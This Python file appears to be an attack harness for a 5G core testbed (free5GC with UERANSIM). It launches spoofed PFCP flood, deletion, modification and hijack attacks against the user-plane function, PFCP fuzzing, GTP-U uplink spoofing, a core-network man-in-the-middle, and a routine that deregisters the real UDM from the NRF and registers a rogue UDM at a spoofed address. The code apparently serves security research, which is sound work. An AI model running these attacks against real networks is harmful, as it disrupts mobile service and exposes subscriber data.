from src.attacks.upf_pfcp.pfcpDosAttack import PFCPDosAttack
from src.attacks.upf_pfcp.pfcpFuzzer import PFCPFuzzer
from src.attacks.upf_pfcp.pfcpHijack import PFCPHijack

from src.attacks.upf_gtp.uplinkSpoofing import start_gtp_uplink_attack

from src.attacks.cn_mitm import start_mitm_for


from markers_process import handle_markers
from src import *
import random, ipaddress, copy, docker


# ---------------------------------------------------------------------------- #
#                                Utils Functions                               #
# ---------------------------------------------------------------------------- #
def generate_random_public_ipv4():

    while True:
        random_int = random.randint(0, 2**32 - 1)
        random_ip = ipaddress.IPv4Address(random_int)
        if random_ip.is_global:
            return str(random_ip)


def get_random_supi():
    client = docker.DockerClient(base_url="unix://var/run/docker.sock")
    container = client.containers.get("ueransim")

    supi_finder = "grep -oP '(?<=supi: \")[^\"]+' config/supi_test.yaml"
    result = container.exec_run(supi_finder, stdout=True, stderr=True)
    print(result.output.decode())


# ---------------------------------------------------------------------------- #
#                               PFCP DoS Attacks                               #
# ---------------------------------------------------------------------------- #
def pfcp_session_establishment_flood_customized(spoofed_addr):

    handle_markers(
        "pfcpSessionEstablishmentFlood",
        lambda: PFCPDosAttack().start_pfcp_session_establishment_flood(
            evil_addr=spoofed_addr,
            upf_addr=ip_list["UPF"],
            reqNbr=20,
            random_far_number=20,
        ),
    )


def pfcp_session_deletion_flood_customized(spoofed_addr):
    handle_markers(
        "pfcpSessionDeletionFlood",
        lambda: PFCPDosAttack().start_pfcp_session_deletion_bruteforce(
            evil_addr=spoofed_addr, upf_addr=ip_list["UPF"], reqNbr=100
        ),
    )


def pfcp_session_deletion_targeted_customized(spoofed_addr):
    handle_markers(
        "pfcpSessionDeletionTargeted",
        lambda: PFCPDosAttack().start_pfcp_session_deletion_targeted(
            evil_addr=spoofed_addr,
            upf_addr=ip_list["UPF"],
            target_seid=random.randint(1, 5),
        ),
    )


def pfcp_session_modification_far_drop_bruteforce_customized(spoofed_addr):
    handle_markers(
        "pfcpSessionModificationFarDropBruteforce",
        lambda: PFCPDosAttack().start_pfcp_session_modification_far_drop_bruteforce(
            evil_addr=spoofed_addr,
            upf_addr=ip_list["UPF"],
            far_range=20,
            session_range=20,
        ),
    )


def pfcp_session_modification_far_dupl_bruteforce_customized(spoofed_addr):
    handle_markers(
        "pfcpSessionModificationFarDuplBruteforce",
        lambda: PFCPDosAttack().start_pfcp_session_modification_far_dupl_bruteforce(
            evil_addr=spoofed_addr,
            upf_addr=ip_list["UPF"],
            far_range=20,
            session_range=20,
        ),
    )


# ---------------------------------------------------------------------------- #
#                             PFCP Fuzzing Attacks                             #
# ---------------------------------------------------------------------------- #
def pfcp_seid_fuzzing_customized(spoofed_addr):
    handle_markers(
        "pfcpSeidFuzzing",
        lambda: PFCPFuzzer().start_PFCP_SEID_fuzzing(
            src_addr=spoofed_addr,
            upf_addr=ip_list["UPF"],
            max_seid=20,
        ),
    )


def pfcp_far_fuzzing_customized(spoofed_addr):
    handle_markers(
        "pfcpFarFuzzing",
        lambda: PFCPFuzzer().start_PFCP_FARID_fuzzing(
            src_addr=spoofed_addr,
            upf_addr=ip_list["UPF"],
            max_far_discover=20,
            max_seid=20,
        ),
    )


# ---------------------------------------------------------------------------- #
#                              PFCP Hijack Attacks                             #
# ---------------------------------------------------------------------------- #
def pfcp_hijack_far_manipulation_customized(spoofed_addr):
    handle_markers(
        "pfcpHijackFarManipulation",
        lambda: PFCPHijack().start_PFCP_hijack_far_manipulation(
            hijacker_addr=spoofed_addr,
            upf_addr=ip_list["UPF"],
            seid=random.randint(1, 20),
        ),
    )


# ---------------------------------------------------------------------------- #
#                                 GTP-U Attacks                                #
# ---------------------------------------------------------------------------- #
def gtp_uplink_attack_customized(spoofed_addr):
    start_gtp_uplink_attack(
        src_addr=spoofed_addr,
        upf_addr=ip_list["UPF"],
        teid=random.randint(1, 10),
        ue_addr=f"10.0.0.{random.randint(1,254)}",
        dst_addr=generate_random_public_ipv4(),
    )


# ---------------------------------------------------------------------------- #
#                             HTTP-Based CN Attacks                            #
# ---------------------------------------------------------------------------- #


def cn_mitm_customized(spoofed_addr):
    handle_markers(
        "cnMitm",
        lambda: start_mitm_for(
            nf_to_replace=ip_list["UDM"],
            seconds=10,
        ),
    )


# ------------------------- UDM Manipulation Attacks ------------------------- #


def spoof_udm_and_restore(spoofed_ip):
    nf_instance_id = generate_variables("uuid")
    add_nf(nf_instance_id, "AMF", display=False)
    token = get_token(nf_instance_id, "AMF", "nnrf-disc", "NRF", display=False)

    code, result = get_nf_info("AMF", token, "UDM", display=False)
    if code >= 300 or "nfInstances" not in result or not result["nfInstances"]:
        print("[!] No UDM instance found.")
        return

    real_udm = result["nfInstances"][0]
    real_nf_instanceId = real_udm["nfInstanceId"]
    real_nf_ip = real_udm["ipv4Addresses"][0]
    real_services = [s["serviceName"] for s in real_udm["nfServices"]]

    print(f"[i] Real UDM instance: {real_nf_instanceId} at {real_nf_ip}")

    remove_nf(real_nf_instanceId, token, display=False)
    print(f"[-] Real UDM {real_nf_instanceId} removed")

    rogue_instance_id = generate_variables("uuid")
    rogue_services = ["nudm-sdm", "nudm-uecm", "nudm-ueau", "nudm-ee", "nudm-pp"]
    add_nf(
        rogue_instance_id, "UDM", rogue_services, ip_address=spoofed_ip, display=False
    )
    print(f"[+] Rogue UDM added at {spoofed_ip} with id {rogue_instance_id}")

    # ----------- The attack you want here (get_am_data / sm_data etc) ----------- #
    # get_am_data()

    add_nf(
        real_nf_instanceId, "UDM", real_services, ip_address=real_nf_ip, display=False
    )
    print(f"[+] Real UDM {real_nf_instanceId} restored at {real_nf_ip}")

    remove_nf(nf_instance_id, token, display=False)
    print(f"[-] AMF instance {nf_instance_id} removed")


def udm_spoofing_customized(spoofed_addr):

    handle_markers(
        "udmSpoofing",
        lambda: spoof_udm_and_restore(spoofed_ip=spoofed_addr),
    )


def free5gcCNFuzzing_customized(spoofed_addr):

    handle_markers(
        "cnFuzzing",
        lambda: Free5GCCNFuzzing().fuzz(
            nf_list=["NRF"],
            nb_file=10,
            nb_url=10,
            nb_method=10,
        ),
    )
